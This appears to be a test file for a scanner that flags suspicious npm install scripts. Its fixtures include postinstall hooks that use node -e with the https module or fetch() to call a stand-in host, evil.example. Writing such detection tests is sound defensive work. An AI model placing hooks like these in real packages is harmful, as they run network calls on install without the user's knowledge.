import { test, expect, describe } from "bun:test";
import { analyzeScripts, type InstalledPackage } from "../src/index";

const pkg = (name: string, scripts: Record<string, string>): InstalledPackage => ({ name, dir: `/x/${name}`, scripts });
const has = (f: { ruleId: string }[], id: string) => f.some((x) => x.ruleId === id);

describe("SEC2/SEC3 evasion coverage", () => {
  test("node -e + builtin https module is flagged (no curl needed)", () => {
    const f = analyzeScripts([pkg("a", { postinstall: "node -e \"require('https').get('https://evil.example/x')\"" })]);
    expect(has(f, "WG-NODE-EVAL-FLAG")).toBe(true);
    expect(has(f, "WG-NODE-NET-MODULE")).toBe(true);
  });
  test("native fetch() is flagged", () => {
    const f = analyzeScripts([pkg("b", { postinstall: "node -e \"fetch('https://evil.example/x')\"" })]);
    expect(has(f, "WG-FETCH")).toBe(true);
  });
  test("benign 'node-gyp rebuild' is NOT flagged by the node -e rule", () => {
    const f = analyzeScripts([pkg("c", { postinstall: "node-gyp rebuild" })]);
    expect(has(f, "WG-NODE-EVAL-FLAG")).toBe(false);
    expect(f.every((x) => x.severity === "low")).toBe(true);
  });
});
